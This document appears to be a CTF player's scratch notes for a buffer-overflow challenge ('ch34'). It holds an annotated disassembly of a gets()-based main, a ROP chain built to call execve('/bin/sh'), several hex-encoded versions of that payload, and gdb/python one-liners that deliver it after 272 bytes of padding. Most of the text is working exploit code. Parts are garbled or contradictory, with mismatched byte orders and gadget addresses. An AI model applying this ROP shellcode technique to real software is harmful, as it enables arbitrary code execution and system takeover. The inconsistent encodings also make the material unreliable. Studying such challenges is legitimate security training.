main:

esp : 0x120
	char **av						:	0x120 -> 0x118
	?
	int ac							: 0x114 -> 0x110

	char buffer[0x100]	: 0x110 -> 0x010
	int len							: 0x008 -> 0x004
	int i								: 0x004 -> 0x000
ebp

   0x000000000040105e <+0>:	push   rbp
   0x000000000040105f <+1>:	mov    rbp,rsp
   0x0000000000401062 <+4>:	sub    rsp,0x120
   0x0000000000401069 <+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x000000000040106f <+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x0000000000401076 <+24>:	lea    rax,[rbp-0x110]
   0x000000000040107d <+31>:	mov    rdi,rax
   0x0000000000401080 <+34>:	call   0x408750 <gets> ; gets(buffer)

   0x0000000000401085 <+39>:	lea    rax,[rbp-0x110]
   0x000000000040108c <+46>:	mov    rdi,rax
   0x000000000040108f <+49>:	call   0x419610 <strlen>
   0x0000000000401094 <+54>:	mov    DWORD PTR [rbp-0x8],eax ; len = strlen(buffer)

   0x0000000000401097 <+57>:	mov    edi,0x493984
   0x000000000040109c <+62>:	mov    eax,0x0
   0x00000000004010a1 <+67>:	call   0x407ef0 <printf> ; printf("Hex result: ")

   0x00000000004010a6 <+72>:	mov    DWORD PTR [rbp-0x4],0x0 ; i = 0

   0x00000000004010ad <+79>:	jmp    0x4010d4 <main+118>
	 while (i < len)
   0x00000000004010af <+81>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004010b2 <+84>:	cdqe ; eax -> rax
   0x00000000004010b4 <+86>:	movzx  eax,BYTE PTR [rbp+rax*1-0x110] ; eax = buffer[i]
   0x00000000004010bc <+94>:	movsx  eax,al
   0x00000000004010bf <+97>:	mov    esi,eax
   0x00000000004010c1 <+99>:	mov    edi,0x493991 ;
   0x00000000004010c6 <+104>:	mov    eax,0x0
   0x00000000004010cb <+109>:	call   0x407ef0 <printf> ; printf("%02x", buffer[i])
   0x00000000004010d0 <+114>:	add    DWORD PTR [rbp-0x4],0x1 ; i++

   0x00000000004010d4 <+118>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004010d7 <+121>:	cmp    eax,DWORD PTR [rbp-0x8]
   0x00000000004010da <+124>:	jl     0x4010af <main+81>

   0x00000000004010dc <+126>:	mov    edi,0xa
   0x00000000004010e1 <+131>:	call   0x408940 <putchar> ; putchar('\n') // 0x408940
   0x00000000004010e6 <+136>:	mov    eax,0x0

   0x00000000004010eb <+141>:	leave
   0x00000000004010ec <+142>:	ret


00 00 00 00 00 43 72 05 ; pop rdx ; ret
00 00 00 00 00 6c 00 00 ; addresse de data
00 00 00 00 00 44 d2 b4 ; pop rax ; ret
00 68 73 2f 6e 69 62 2f ; bin/sh
00 00 00 00 00 47 63 a4 ; mov qword ptr [rdx], rax ; pop rbx ; ret
00 00 00 00 00 00 00 00 ; valeur de rbx
00 00 00 00 00 40 16 d3	; pop rdi ; ret
00 00 00 00 00 6c 00 00	; addresse de /bin/sh
00 00 00 00 00 40 17 e7 ; pop rsi ; ret
00 00 00 00 00 00 00 00 ; valeur de rsi
00 00 00 00 00 43 72 05 ; pop rdx, ret
00 00 00 00 00 00 00 00 ; valeur de rdx
00 00 00 00 00 44 d2 b4 ; pop rax ; ret
00 00 00 00 00 00 00 3b ; valeur de rax
00 00 00 00 00 43 4d f0 ; mov eax, 0xb ; syscall

'\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00''\x2f''\x62''\x69''\x6e''\x2f''\x73''\x68''\x00''\xa4''\x63''\x47''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\xd3''\x16''\x40''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xe7''\x17''\x40''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\xf0''\x4d''\x43''\x00''\x00''\x00''\x00''\x00'



'\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00'
'\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00'
'\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00'
'\x00''\x68''\x73''\x2f''\x6e''\x69''\x62''\x2f'
'\xa4''\x63''\x47''\x00''\x00''\x00''\x00''\x00'
'\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00'
'\xa7''\x81''\x4b''\x00''\x00''\x00''\x00''\x00'
'\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00'
'\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00'
'\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00'
'\xf0''\x4d''\x43''\x00''\x00''\x00''\x00''\x00'

'\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00''\x00''\x68''\x73''\x2f''\x6e''\x69''\x62''\x2f''\xa4''\x63''\x47''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xa7''\x81''\x4b''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\xf0''\x4d''\x43''\x00''\x00''\x00''\x00''\x00'



'\x00''\x00''\x00''\x00''\x00''\x43''\x72''\x05''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x44''\xd2''\xb4''\x2f''\x62''\x69''\x6e''\x2f''\x73''\x68''\x00''\x00''\x00''\x00''\x00''\x00''\x47''\x63''\xa4''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x4b''\x81''\xa7''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x43''\x72''\x05''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x43''\x4d''\xf0'

gdb ./ch34 -ex "set args < <(python -c \"print 'a' * 272 + 'b' * 8 +'\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00''\x2f''\x62''\x69''\x6e''\x2f''\x73''\x68''\x00''\xa4''\x63''\x47''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\xd3''\x16''\x40''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xe7''\x17''\x40''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\xf0''\x4d''\x43''\x00''\x00''\x00''\x00''\x00'\")"


gdb ./ch34 -ex "set args < <(python -c \"print 'a' * 272 + 'b' * 8 + '\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00''\x00''\x68''\x73''\x2f''\x6e''\x69''\x62''\x2f'\")"

gdb''\x./ch34 -ex "set args < <(python -c \"print 'a' * 272 + 'b' * 8 + \")"
gdb ./ch34 -ex "set args < <(python -c \"print 'a' * 272 + 'b' * 8 + '\x05''\x72''\x43''\x00''\x00''\x00''\x00''\x00''\x00''\x00''\x6c''\x00''\x00''\x00''\x00''\x00''\xb4''\xd2''\x44''\x00''\x00''\x00''\x00''\x00''\x00''\x68''\x73''\x2f''\x6e''\x69''\x62''\x2f'\")"


.data : 0x00000000006c0000
